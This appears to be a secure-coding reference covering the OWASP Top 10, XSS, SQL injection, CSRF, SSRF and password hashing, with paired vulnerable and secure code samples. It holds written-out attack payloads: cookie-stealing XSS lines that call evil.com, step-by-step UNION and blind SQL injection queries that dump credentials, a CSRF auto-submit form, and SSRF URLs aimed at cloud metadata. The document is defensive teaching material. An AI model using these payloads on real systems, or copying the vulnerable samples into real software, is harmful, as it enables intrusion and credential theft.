# Sentinel Library: Web Security Fundamentals

> Reference knowledge for secure web development
> Read BEFORE writing any authentication, input handling, or data access code

---

## Table of Contents

1. [OWASP Top 10 (2025)](#owasp-top-10-2025)
2. [Cross-Site Scripting (XSS) Prevention](#cross-site-scripting-xss-prevention)
3. [SQL Injection Deep Dive](#sql-injection-deep-dive)
4. [CSRF Protection](#csrf-protection)
5. [SSRF Prevention](#ssrf-prevention)
6. [Authentication Best Practices](#authentication-best-practices)
7. [Session Management](#session-management)
8. [Input Validation Patterns](#input-validation-patterns)

---

## OWASP Top 10 (2025)

The Open Web Application Security Project maintains the authoritative list of the most
critical web application security risks. Every developer must know these categories.

| Rank | Category | Risk Description |
|------|----------|-----------------|
| A01 | Broken Access Control | Users act outside their intended permissions. IDOR, privilege escalation, missing function-level access checks. |
| A02 | Cryptographic Failures | Sensitive data exposure from weak hashing, plaintext storage, broken TLS, or missing encryption at rest. |
| A03 | Injection | Hostile data sent to an interpreter as part of a command or query. SQL, NoSQL, OS command, LDAP injection. |
| A04 | Insecure Design | Architectural flaws that cannot be fixed by implementation alone. Missing threat modeling, insecure patterns. |
| A05 | Security Misconfiguration | Default credentials, open cloud storage, unnecessary features enabled, missing security headers. |
| A06 | Vulnerable and Outdated Components | Using libraries with known CVEs. No patch management or version monitoring. |
| A07 | Identification and Authentication Failures | Weak passwords permitted, credential stuffing unblocked, broken session management. |
| A08 | Software and Data Integrity Failures | Unsigned updates, insecure CI/CD pipelines, deserialization of untrusted data. |
| A09 | Security Logging and Monitoring Failures | Insufficient logging of security events. No alerting on brute-force, data exfiltration, or privilege escalation. |
| A10 | Server-Side Request Forgery (SSRF) | Application fetches a remote resource without validating the user-supplied URL. Internal network scanning, metadata theft. |

---

### A01: Broken Access Control -- Insecure Direct Object Reference (IDOR)

IDOR occurs when the server uses user-controlled input (like an ID in the URL) to
look up resources without verifying the requesting user owns that resource.

```php
// VULNERABLE -- PHP: No ownership check. Any authenticated user can view any invoice
// by changing the invoice_id parameter in the URL.
// An attacker changes ?invoice_id=1001 to ?invoice_id=1002 and sees another user's data.

Route::get('/invoice', function (Request $request) {
    $invoiceId = $request->query('invoice_id');
    $invoice = DB::table('invoices')->where('id', $invoiceId)->first();
    return view('invoice.show', ['invoice' => $invoice]);
});
```

```php
// SECURE -- PHP: Scope the query to the authenticated user's own records.
// Even if the attacker guesses a valid invoice_id, the WHERE clause ensures
// they can only retrieve invoices that belong to them.

Route::get('/invoice', function (Request $request) {
    $invoiceId = $request->query('invoice_id');
    $userId = auth()->id();

    // The user_id condition makes IDOR exploitation impossible
    $invoice = DB::table('invoices')
        ->where('id', $invoiceId)
        ->where('user_id', $userId)
        ->first();

    if (!$invoice) {
        abort(404); // Generic 404, do not reveal "access denied" to avoid enumeration
    }

    return view('invoice.show', ['invoice' => $invoice]);
});
```

```javascript
// VULNERABLE -- Node.js/Express: The route parameter is used directly without
// checking if the requesting user has permission to access this profile.

app.get('/api/users/:userId/profile', async (req, res) => {
    const profile = await db.query('SELECT * FROM profiles WHERE user_id = $1', [req.params.userId]);
    res.json(profile.rows[0]);
});
```

```javascript
// SECURE -- Node.js/Express: Compare the route parameter against the authenticated
// session user. Only allow access to the user's own profile, or require admin role.

app.get('/api/users/:userId/profile', authenticate, async (req, res) => {
    const requestedId = parseInt(req.params.userId, 10);

    // Authorization check: user can only access their own profile unless admin
    if (req.user.id !== requestedId && req.user.role !== 'admin') {
        return res.status(404).json({ error: 'Not found' });
    }

    const profile = await db.query('SELECT * FROM profiles WHERE user_id = $1', [requestedId]);
    if (!profile.rows[0]) {
        return res.status(404).json({ error: 'Not found' });
    }
    res.json(profile.rows[0]);
});
```

---

### A02: Cryptographic Failures -- Weak Hashing

Using fast hashing algorithms (MD5, SHA-1, SHA-256 without key stretching) for passwords
makes brute-force attacks trivial. Modern GPUs can compute billions of SHA-256 hashes per second.

```python
# VULNERABLE -- Python: MD5 is a message digest, not a password hash.
# A rainbow table attack can reverse most MD5 password hashes in seconds.
# MD5 also has known collision attacks making it cryptographically broken.

import hashlib

def store_password(password: str) -> str:
    return hashlib.md5(password.encode()).hexdigest()

def verify_password(password: str, stored_hash: str) -> bool:
    return hashlib.md5(password.encode()).hexdigest() == stored_hash
```

```python
# SECURE -- Python: argon2id is the current recommendation from OWASP.
# It is memory-hard (resistant to GPU attacks), has built-in salting,
# and the verify function is timing-safe to prevent side-channel attacks.

from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

ph = PasswordHasher(
    time_cost=3,        # Number of iterations
    memory_cost=65536,  # 64 MB memory usage -- makes GPU attacks expensive
    parallelism=4,      # Number of parallel threads
)

def store_password(password: str) -> str:
    # Returns a string containing the salt, algorithm params, and hash
    return ph.hash(password)

def verify_password(password: str, stored_hash: str) -> bool:
    try:
        return ph.verify(stored_hash, password)
    except VerifyMismatchError:
        return False
```

---

### A03: Injection -- SQL Injection Login Bypass

The classic attack: injecting SQL syntax into a login form to bypass authentication entirely.

```php
// VULNERABLE -- PHP: String concatenation builds the SQL query.
// Attacker enters: username = admin' -- and any password.
// The query becomes: SELECT * FROM users WHERE username='admin' --' AND password='...'
// The -- comments out the password check. The attacker logs in as admin.

function login(string $username, string $password): ?array {
    $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    $result = mysqli_query($conn, $query);
    return mysqli_fetch_assoc($result);
}
```

```php
// SECURE -- PHP PDO: Parameterized queries separate SQL structure from data.
// The database driver treats $username and $passwordHash as literal values,
// never as SQL syntax. Injection is structurally impossible.

function login(PDO $pdo, string $username, string $password): ?array {
    $stmt = $pdo->prepare('SELECT id, username, password_hash FROM users WHERE username = :username');
    $stmt->execute(['username' => $username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user && password_verify($password, $user['password_hash'])) {
        return $user;
    }
    return null;
}
```

---

## Cross-Site Scripting (XSS) Prevention

XSS allows attackers to execute arbitrary JavaScript in another user's browser session.
This enables session hijacking, credential theft, defacement, and malware distribution.

### DOM-Based XSS

DOM-based XSS occurs entirely in the browser. The server never sees the malicious payload --
client-side JavaScript reads tainted data (URL fragment, postMessage, localStorage) and
writes it into the DOM without sanitization.

```javascript
// VULNERABLE -- JavaScript: innerHTML parses the string as HTML.
// If the URL is: page.html#<img src=x onerror=alert(document.cookie)>
// The browser executes the onerror handler, stealing the user's session cookie.

const userContent = window.location.hash.substring(1);
document.getElementById('output').innerHTML = decodeURIComponent(userContent);
// The attacker sends the victim a link with a crafted hash fragment.
// The payload executes in the victim's browser with full DOM access.
```

```javascript
// SECURE -- JavaScript: Use textContent which treats input as plain text,
// never parsing it as HTML. For cases where HTML rendering is needed,
// use DOMPurify to strip dangerous tags and attributes.

import DOMPurify from 'dompurify';

const userContent = decodeURIComponent(window.location.hash.substring(1));

// Option 1: When you only need text output (preferred)
document.getElementById('output').textContent = userContent;

// Option 2: When you genuinely need to render HTML from user input
// DOMPurify removes <script>, event handlers, javascript: URLs, and other vectors
const cleanHtml = DOMPurify.sanitize(userContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false,  // Block data-* attributes that could be abused
});
document.getElementById('output').innerHTML = cleanHtml;
```

### Reflected XSS

Reflected XSS occurs when the server includes unsanitized user input in the HTTP response.
The attacker crafts a URL containing the payload and tricks the victim into clicking it.

```php
// VULNERABLE -- PHP: The search parameter is echoed directly into HTML.
// URL: /search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
// The server reflects the script tag into the page, and the browser executes it.

<?php
$searchTerm = $_GET['q'];
echo "<h1>Search results for: $searchTerm</h1>";
// The victim's cookies are sent to the attacker's server.
?>
```

```php
// SECURE -- PHP: htmlspecialchars converts <, >, ", and & to HTML entities.
// The browser renders them as literal text, not as HTML tags or script elements.
// ENT_QUOTES escapes both single and double quotes to prevent attribute injection.

<?php
$searchTerm = $_GET['q'] ?? '';
$safeOutput = htmlspecialchars($searchTerm, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
echo "<h1>Search results for: {$safeOutput}</h1>";

// In Laravel Blade templates, {{ }} auto-escapes by default:
// <h1>Search results for: {{ $searchTerm }}</h1>
// NEVER use {!! !!} with user input -- it outputs raw unescaped HTML.
?>
```

### Stored XSS

Stored XSS persists the payload in the database. Every user who views the affected page
gets hit -- no special URL needed. This is the most dangerous XSS variant because it
scales to every visitor automatically.

```python
# VULNERABLE -- Python/Django: The comment body is saved to the database and
# rendered without escaping. An attacker posts a comment containing:
# <script>new Image().src='https://evil.com/grab?c='+document.cookie</script>
# Every user who views the comments page executes the attacker's script.

from django.http import HttpResponse
from django.utils.html import format_html

def post_comment(request):
    body = request.POST.get('body', '')
    Comment.objects.create(author=request.user, body=body)
    return redirect('comments_list')

def list_comments(request):
    comments = Comment.objects.all()
    html = ''
    for comment in comments:
        # mark_safe or format_html with unescaped input is the vulnerability
        html += f'<div class="comment"><p>{comment.body}</p></div>'
    return HttpResponse(html)
```

```python
# SECURE -- Python/Django: Sanitize HTML on input using bleach (or nh3),
# and rely on Django's template auto-escaping on output.
# Defense in depth: sanitize on write AND escape on read.

import bleach

ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li']
ALLOWED_ATTRIBUTES = {'a': ['href', 'title']}
ALLOWED_PROTOCOLS = ['https']  # Block javascript: and data: URI schemes

def post_comment(request):
    raw_body = request.POST.get('body', '')

    # Sanitize on input: strip everything not in the allowlist
    clean_body = bleach.clean(
        raw_body,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        protocols=ALLOWED_PROTOCOLS,
        strip=True,  # Remove disallowed tags entirely rather than escaping them
    )

    Comment.objects.create(author=request.user, body=clean_body)
    return redirect('comments_list')

# In the Django template, auto-escaping handles output:
# {% for comment in comments %}
#   <div class="comment"><p>{{ comment.body }}</p></div>
# {% endfor %}
# Django's {{ }} auto-escapes by default. Never use |safe with user content.
```

### Content Security Policy (CSP) Headers

CSP is a defense-in-depth header that tells the browser which sources are allowed to
load scripts, styles, images, and other resources. A strict CSP makes XSS exploitation
significantly harder even when a vulnerability exists.

```
# WEAK CSP -- allows inline scripts, which is exactly what XSS exploits
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'
# 'unsafe-inline' defeats the purpose of CSP entirely.
# 'unsafe-eval' allows eval(), Function(), and setTimeout(string), all XSS vectors.
```

```
# STRICT CSP -- nonce-based policy that blocks all inline scripts except those
# with a server-generated cryptographic nonce. The nonce changes on every response,
# so an attacker cannot predict it.

Content-Security-Policy:
    default-src 'none';
    script-src 'self' 'nonce-{RANDOM_BASE64}';
    style-src 'self' 'nonce-{RANDOM_BASE64}';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self' https://api.yoursite.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;
```

```php
// PHP: Generating a nonce and setting the CSP header

$nonce = base64_encode(random_bytes(16));
header("Content-Security-Policy: default-src 'none'; script-src 'self' 'nonce-{$nonce}'; style-src 'self' 'nonce-{$nonce}'; img-src 'self' data: https:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'");

// In HTML, attach the nonce to every legitimate script tag:
// <script nonce="<?= $nonce ?>">legitimateCode();</script>
// Injected scripts won't have the nonce and will be blocked by the browser.
```

```javascript
// Node.js/Express: CSP middleware with per-request nonce generation

const crypto = require('crypto');

app.use((req, res, next) => {
    // Generate a cryptographically random nonce for this request
    res.locals.cspNonce = crypto.randomBytes(16).toString('base64');

    res.setHeader('Content-Security-Policy', [
        "default-src 'none'",
        `script-src 'self' 'nonce-${res.locals.cspNonce}'`,
        `style-src 'self' 'nonce-${res.locals.cspNonce}'`,
        "img-src 'self' data: https:",
        "connect-src 'self'",
        "frame-ancestors 'none'",
        "base-uri 'self'",
        "form-action 'self'",
    ].join('; '));

    next();
});
```

---

## SQL Injection Deep Dive

SQL injection remains one of the most exploited vulnerabilities despite being fully
preventable with parameterized queries. Understanding the attack variants helps
identify subtle injection points that automated scanners miss.

### Classic Injection -- Login Bypass

```
-- The attacker enters this as the username field:
' OR 1=1 --

-- The application builds this query:
SELECT * FROM users WHERE username='' OR 1=1 --' AND password='anything'

-- Result: 1=1 is always true, the -- comments out the password check.
-- The query returns ALL users. The application logs in as the first row (usually admin).
```

### Union-Based Injection -- Schema Extraction

Union injection appends a second SELECT to extract data from arbitrary tables.
The attacker must match the column count of the original query.

```
-- Step 1: Determine column count with ORDER BY
/products?id=1 ORDER BY 1 --    (works)
/products?id=1 ORDER BY 2 --    (works)
/products?id=1 ORDER BY 3 --    (works)
/products?id=1 ORDER BY 4 --    (error -- so there are 3 columns)

-- Step 2: Find which columns are displayed in the response
/products?id=-1 UNION SELECT 'aaa','bbb','ccc' --
-- The response shows 'bbb' in the product name field (column 2 is visible)

-- Step 3: Extract the database schema
/products?id=-1 UNION SELECT null,GROUP_CONCAT(table_name),null FROM information_schema.tables WHERE table_schema=database() --
-- Returns: users,products,orders,sessions

-- Step 4: Extract column names from the users table
/products?id=-1 UNION SELECT null,GROUP_CONCAT(column_name),null FROM information_schema.columns WHERE table_name='users' --
-- Returns: id,username,password_hash,email,role,created_at

-- Step 5: Dump credentials
/products?id=-1 UNION SELECT null,GROUP_CONCAT(username,':',password_hash),null FROM users --
-- Returns: admin:$2y$10$abcdef...,user1:$2y$10$ghijkl...
```

### Blind Injection -- Boolean-Based

When the application does not display query results but shows different behavior
(page content, HTTP status, redirect) based on whether the query returns rows.

```
-- Boolean-based: Ask true/false questions and observe the response difference

-- Does the admin user exist?
/profile?id=1 AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --
-- If the page loads normally: yes. If it shows an error or empty: no.

-- Extract the admin password hash one character at a time:
/profile?id=1 AND SUBSTRING((SELECT password_hash FROM users WHERE username='admin'),1,1)='$' --
-- Normal page = first character is '$'. Iterate through all characters.
-- Automated tools like sqlmap perform thousands of these requests per second.
```

### Blind Injection -- Time-Based

When there is no visible difference in the response, the attacker uses deliberate
delays to infer boolean conditions.

```
-- Time-based: If the condition is true, the database sleeps for 5 seconds.
-- The attacker measures response time to determine truth.

-- MySQL:
/profile?id=1 AND IF((SELECT COUNT(*) FROM users WHERE role='admin')>0, SLEEP(5), 0) --

-- PostgreSQL:
/profile?id=1 AND CASE WHEN (SELECT COUNT(*) FROM users WHERE role='admin')>0 THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- Response takes 5 seconds = condition is true.
-- Response is instant = condition is false.
```

### Error-Based Injection

Extracting data through deliberately triggered database error messages that include
query results in the error text.

```
-- MySQL error-based extraction using ExtractValue:
/products?id=1 AND ExtractValue(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --
-- Error: "XPATH syntax error: '~8.0.36~'"
-- The database version is leaked in the error message.

-- PostgreSQL error-based using CAST:
/products?id=1 AND 1=CAST((SELECT current_user) AS int) --
-- Error: "invalid input syntax for type integer: 'postgres'"
-- The current database user is leaked in the error message.
```

### Defense: Parameterized Queries Across Languages

The ONLY reliable defense against SQL injection is parameterized queries (prepared statements).
Input sanitization and escaping are fragile and should never be relied upon alone.

```php
// SECURE -- PHP PDO: Named parameters with explicit type binding
// The database driver sends the SQL structure and values separately over the wire.
// The database compiles the SQL first, then substitutes values -- injection is impossible.

function searchProducts(PDO $pdo, string $name, float $maxPrice, int $limit): array {
    $sql = 'SELECT id, name, price, description
            FROM products
            WHERE name LIKE :name
            AND price <= :max_price
            AND is_active = 1
            ORDER BY created_at DESC
            LIMIT :limit';

    $stmt = $pdo->prepare($sql);
    $stmt->bindValue(':name', '%' . $name . '%', PDO::PARAM_STR);
    $stmt->bindValue(':max_price', $maxPrice);
    $stmt->bindValue(':limit', $limit, PDO::PARAM_INT); // Explicit int type for LIMIT
    $stmt->execute();

    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}
```

```javascript
// SECURE -- Node.js with pg (node-postgres): Positional parameters ($1, $2, ...).
// The pg driver sends parameters out-of-band from the query string.

const { Pool } = require('pg');
const pool = new Pool();

async function searchProducts(name, maxPrice, limit) {
    // $1, $2, $3 are positional parameter placeholders
    const query = {
        text: `SELECT id, name, price, description
               FROM products
               WHERE name ILIKE $1
               AND price <= $2
               AND is_active = true
               ORDER BY created_at DESC
               LIMIT $3`,
        values: [`%${name}%`, maxPrice, limit],
    };

    const result = await pool.query(query);
    return result.rows;
}
```

```python
# SECURE -- Python with psycopg2: %s placeholders are NOT string formatting.
# psycopg2 sends them as parameterized query values to PostgreSQL.
# NEVER use f-strings or .format() to build SQL queries.

import psycopg2
from psycopg2.extras import RealDictCursor

def search_products(conn, name: str, max_price: float, limit: int) -> list[dict]:
    with conn.cursor(cursor_factory=RealDictCursor) as cur:
        # The %s placeholders are handled by psycopg2, not Python string formatting
        cur.execute(
            """SELECT id, name, price, description
               FROM products
               WHERE name ILIKE %s
               AND price <= %s
               AND is_active = true
               ORDER BY created_at DESC
               LIMIT %s""",
            (f'%{name}%', max_price, limit),  # Tuple of parameters
        )
        return cur.fetchall()
```

---

## CSRF Protection

Cross-Site Request Forgery tricks a victim's browser into making authenticated requests
to a target site. The browser automatically attaches cookies, so the target application
sees a legitimate authenticated request from the victim.

### How CSRF Works

```
1. Victim logs into bank.com (session cookie is set)
2. Victim visits evil.com while still logged in
3. evil.com contains: <form action="https://bank.com/transfer" method="POST">
   <input type="hidden" name="to" value="attacker_account">
   <input type="hidden" name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>
4. The browser sends the POST to bank.com WITH the victim's session cookie
5. bank.com sees a valid authenticated request and processes the transfer
```

### Synchronizer Token Pattern

The server generates a random token per session, embeds it in forms, and validates it
on every state-changing request. The attacker's site cannot read the token due to
same-origin policy.

```php
// SECURE -- Laravel: CSRF protection is built-in and enabled by default.
// The @csrf directive inserts a hidden input with the session's CSRF token.
// The VerifyCsrfToken middleware rejects requests without a valid token.

// In Blade template:
// <form method="POST" action="/transfer">
//     @csrf
//     <input type="text" name="amount">
//     <button type="submit">Transfer</button>
// </form>

// For AJAX requests, include the token in the X-XSRF-TOKEN header:
// Laravel reads the XSRF-TOKEN cookie (which is NOT HttpOnly for this purpose)
// and accepts it as a header value.

// In your JavaScript:
// axios defaults automatically include this header if the cookie exists.
// For fetch():
// fetch('/api/transfer', {
//     method: 'POST',
//     headers: {
//         'Content-Type': 'application/json',
//         'X-XSRF-TOKEN': getCookie('XSRF-TOKEN'),
//     },
//     body: JSON.stringify({ amount: 100 }),
// });
```

```javascript
// SECURE -- Express with csurf (or csrf-csrf for modern Express):
// Generate a token per session and validate it on every POST/PUT/DELETE/PATCH.

const { doubleCsrf } = require('csrf-csrf');

const { doubleCsrfProtection, generateToken } = doubleCsrf({
    getSecret: () => process.env.CSRF_SECRET,
    cookieName: '__csrf',
    cookieOptions: {
        httpOnly: true,
        sameSite: 'strict',
        secure: process.env.NODE_ENV === 'production',
        path: '/',
    },
    getTokenFromRequest: (req) => req.headers['x-csrf-token'] || req.body._csrf,
});

// Apply to all state-changing routes
app.use(doubleCsrfProtection);

// Provide token to client in a route
app.get('/csrf-token', (req, res) => {
    res.json({ token: generateToken(req, res) });
});
```

```python
# SECURE -- Django: CSRF protection is enabled by default via CsrfViewMiddleware.
# In templates, {% csrf_token %} inserts the hidden field.
# For AJAX, read the csrftoken cookie and send it as X-CSRFToken header.

# settings.py -- these are the important CSRF-related settings:
CSRF_COOKIE_HTTPONLY = False   # Must be False so JS can read it for AJAX
CSRF_COOKIE_SECURE = True     # Only send over HTTPS in production
CSRF_COOKIE_SAMESITE = 'Lax'  # Prevents CSRF from cross-site navigation
CSRF_TRUSTED_ORIGINS = [
    'https://yourdomain.com',  # Explicitly list trusted origins
]

# In template:
# <form method="POST">
#     {% csrf_token %}
#     ...
# </form>

# For JavaScript/AJAX requests:
# function getCookie(name) {
#     const value = document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)');
#     return value ? value.pop() : '';
# }
# fetch('/api/transfer', {
#     method: 'POST',
#     headers: { 'X-CSRFToken': getCookie('csrftoken') },
#     body: JSON.stringify(data),
# });
```

### SameSite Cookie Attribute

SameSite is a cookie attribute that controls whether the browser sends the cookie
on cross-site requests. It is a powerful CSRF mitigation but should not be the only defense.

```
Set-Cookie: sessionid=abc123; SameSite=Lax; Secure; HttpOnly; Path=/

SameSite=Strict  -- Cookie is NEVER sent on cross-site requests. Most secure but
                    breaks legitimate flows (clicking a link from email to your site
                    would not include the session cookie).

SameSite=Lax     -- Cookie is sent on cross-site top-level navigation (GET) but NOT
                    on cross-site POST, PUT, DELETE. Good default that stops CSRF on
                    state-changing methods while preserving usability.

SameSite=None    -- Cookie is always sent cross-site. Must be paired with Secure flag.
                    Only use when you genuinely need cross-site cookies (third-party embed).
```

---

## SSRF Prevention

Server-Side Request Forgery occurs when an application makes HTTP requests to a
URL supplied by the user without proper validation. The server becomes a proxy for
the attacker, reaching internal networks and cloud metadata endpoints.

### Attack Scenarios

```
# AWS Metadata theft -- the most common SSRF exploitation in cloud environments.
# The attacker submits this URL to a feature like "fetch URL preview":
https://yourapp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# The server fetches the AWS instance metadata endpoint (only reachable from inside AWS).
# Returns: temporary AWS access keys with whatever permissions the instance role has.
# The attacker now has AWS credentials for S3, RDS, Lambda, etc.

# Internal network scanning:
https://yourapp.com/fetch?url=http://192.168.1.1/admin
https://yourapp.com/fetch?url=http://localhost:6379/  (Redis -- no auth by default)
https://yourapp.com/fetch?url=http://internal-api.company.local/users
```

```php
// VULNERABLE -- PHP: file_get_contents fetches any URL the user provides.
// No validation of the target host. The server's network position is exploited.

function fetchPreview(string $url): string {
    $content = file_get_contents($url);
    return extractTitle($content);
}
```

```php
// SECURE -- PHP: URL allowlist + IP validation + DNS rebinding protection.
// Multiple layers because each defense alone has bypass techniques.

function fetchPreview(string $url): string {
    // Step 1: Parse and validate the URL structure
    $parsed = parse_url($url);
    if (!$parsed || !isset($parsed['scheme'], $parsed['host'])) {
        throw new InvalidArgumentException('Invalid URL format');
    }

    // Step 2: Only allow HTTPS (blocks file://, gopher://, dict://, etc.)
    if ($parsed['scheme'] !== 'https') {
        throw new InvalidArgumentException('Only HTTPS URLs are allowed');
    }

    // Step 3: Resolve DNS BEFORE connecting to prevent DNS rebinding.
    // DNS rebinding: attacker's DNS returns public IP first (passes check),
    // then returns 127.0.0.1 on the actual connection.
    $ip = gethostbyname($parsed['host']);

    // Step 4: Block internal/private IP ranges
    $blockedRanges = [
        '127.',          // Loopback
        '10.',           // Private Class A
        '172.16.',       // Private Class B (172.16.0.0 - 172.31.255.255)
        '192.168.',      // Private Class C
        '169.254.',      // Link-local (AWS metadata lives here)
        '0.',            // Default route
        'fc00:',         // IPv6 unique local
        'fe80:',         // IPv6 link-local
        '::1',           // IPv6 loopback
    ];

    foreach ($blockedRanges as $range) {
        if (str_starts_with($ip, $range)) {
            throw new InvalidArgumentException('Internal addresses are not allowed');
        }
    }

    // Step 5: Use cURL with explicit IP to prevent DNS rebinding between
    // our check and the actual connection
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RESOLVE => ["{$parsed['host']}:443:{$ip}"],  // Pin resolved IP
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => false,  // Do not follow redirects (redirect to internal IP)
        CURLOPT_TIMEOUT => 5,
        CURLOPT_MAXFILESIZE => 1048576,   // 1 MB max response size
    ]);

    $content = curl_exec($ch);
    curl_close($ch);

    return extractTitle($content);
}
```

```javascript
// SECURE -- Node.js: Using ssrf-req-filter or manual validation

const { URL } = require('url');
const dns = require('dns').promises;
const ipRangeCheck = require('ip-range-check');

const BLOCKED_RANGES = [
    '127.0.0.0/8', '10.0.0.0/8', '172.16.0.0/12',
    '192.168.0.0/16', '169.254.0.0/16', '0.0.0.0/8',
];

async function safeFetch(userUrl) {
    const parsed = new URL(userUrl);

    // Only allow HTTPS
    if (parsed.protocol !== 'https:') {
        throw new Error('Only HTTPS URLs are allowed');
    }

    // Resolve DNS before connecting
    const { address } = await dns.lookup(parsed.hostname);

    // Check against blocked ranges
    if (ipRangeCheck(address, BLOCKED_RANGES)) {
        throw new Error('Internal addresses are not allowed');
    }

    // Fetch with timeout and size limit, no redirect following
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);

    try {
        const response = await fetch(userUrl, {
            signal: controller.signal,
            redirect: 'error',  // Reject redirects to prevent redirect-to-internal attacks
        });
        const text = await response.text();
        return text.substring(0, 1048576); // Cap response size
    } finally {
        clearTimeout(timeout);
    }
}
```

```python
# SECURE -- Python: Validate before requesting

import ipaddress
import socket
from urllib.parse import urlparse

import requests

BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('0.0.0.0/8'),
]

def safe_fetch(user_url: str, timeout: int = 5) -> str:
    parsed = urlparse(user_url)

    if parsed.scheme != 'https':
        raise ValueError('Only HTTPS URLs are allowed')

    # Resolve DNS before connecting to prevent rebinding
    resolved_ip = socket.gethostbyname(parsed.hostname)
    ip_obj = ipaddress.ip_address(resolved_ip)

    # Check if the resolved IP is in any blocked range
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
        raise ValueError('Internal addresses are not allowed')

    for network in BLOCKED_NETWORKS:
        if ip_obj in network:
            raise ValueError('Internal addresses are not allowed')

    # Fetch with no redirect following and size cap
    response = requests.get(
        user_url,
        timeout=timeout,
        allow_redirects=False,
        stream=True,
    )

    # Read at most 1 MB
    content = response.content[:1_048_576]
    return content.decode('utf-8', errors='replace')
```

---

## Authentication Best Practices

### Password Hashing: bcrypt vs argon2id

OWASP recommends argon2id as the primary choice for new applications. bcrypt remains
acceptable for existing systems. NEVER use MD5, SHA-1, SHA-256, or SHA-512 alone.

```php
// SECURE -- PHP: password_hash uses bcrypt by default (PASSWORD_DEFAULT).
// As of PHP 8.x, you can also use PASSWORD_ARGON2ID if compiled with libargon2.
// password_hash automatically generates a cryptographically random salt.

function registerUser(PDO $pdo, string $email, string $password): int {
    // Cost factor 12 means 2^12 = 4096 iterations.
    // Increase to 13 or 14 as hardware gets faster.
    $hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

    $stmt = $pdo->prepare('INSERT INTO users (email, password_hash) VALUES (:email, :hash)');
    $stmt->execute(['email' => $email, 'hash' => $hash]);
    return (int) $pdo->lastInsertId();
}

function verifyUser(PDO $pdo, string $email, string $password): ?array {
    $stmt = $pdo->prepare('SELECT id, email, password_hash FROM users WHERE email = :email');
    $stmt->execute(['email' => $email]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$user) {
        // Timing attack mitigation: hash a dummy password even when user is not found.
        // This ensures the response time is similar whether the email exists or not.
        password_hash('dummy_password_for_timing', PASSWORD_BCRYPT, ['cost' => 12]);
        return null;
    }

    if (!password_verify($password, $user['password_hash'])) {
        return null;
    }

    // Rehash if the algorithm or cost has changed since this hash was stored.
    // This transparently upgrades hashes during login.
    if (password_needs_rehash($user['password_hash'], PASSWORD_BCRYPT, ['cost' => 12])) {
        $newHash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
        $pdo->prepare('UPDATE users SET password_hash = :hash WHERE id = :id')
            ->execute(['hash' => $newHash, 'id' => $user['id']]);
    }

    return $user;
}
```

```javascript
// SECURE -- Node.js: bcrypt with cost factor 12

const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;  // 2^12 iterations. Increase over time.

async function registerUser(email, password) {
    // bcrypt.hash generates a random salt and hashes in one step
    const passwordHash = await bcrypt.hash(password, SALT_ROUNDS);

    const result = await db.query(
        'INSERT INTO users (email, password_hash) VALUES ($1, $2) RETURNING id',
        [email, passwordHash]
    );
    return result.rows[0].id;
}

async function verifyUser(email, password) {
    const result = await db.query(
        'SELECT id, email, password_hash FROM users WHERE email = $1',
        [email]
    );

    if (!result.rows[0]) {
        // Timing attack mitigation: run a hash comparison even for non-existent users
        await bcrypt.hash('dummy_password_for_timing', SALT_ROUNDS);
        return null;
    }

    const user = result.rows[0];
    // bcrypt.compare is timing-safe internally
    const valid = await bcrypt.compare(password, user.password_hash);
    return valid ? user : null;
}
```

```python
# SECURE -- Python: argon2id via the argon2-cffi library
# argon2id is memory-hard: it requires significant RAM per hash attempt,
# making GPU-based and ASIC-based cracking attacks economically infeasible.

from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

# OWASP recommended parameters for argon2id:
# time_cost=2 (iterations), memory_cost=19456 (19 MB), parallelism=1
# Adjust upward for higher security; measure to keep login under 500ms.
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)

def register_user(conn, email: str, password: str) -> int:
    password_hash = ph.hash(password)

    with conn.cursor() as cur:
        cur.execute(
            'INSERT INTO users (email, password_hash) VALUES (%s, %s) RETURNING id',
            (email, password_hash),
        )
        conn.commit()
        return cur.fetchone()[0]

def verify_user(conn, email: str, password: str) -> dict | None:
    with conn.cursor() as cur:
        cur.execute(
            'SELECT id, email, password_hash FROM users WHERE email = %s',
            (email,),
        )
        row = cur.fetchone()

    if not row:
        # Timing attack mitigation
        ph.hash('dummy_password_for_timing')
        return None

    user = {'id': row[0], 'email': row[1], 'password_hash': row[2]}

    try:
        ph.verify(user['password_hash'], password)
    except VerifyMismatchError:
        return None

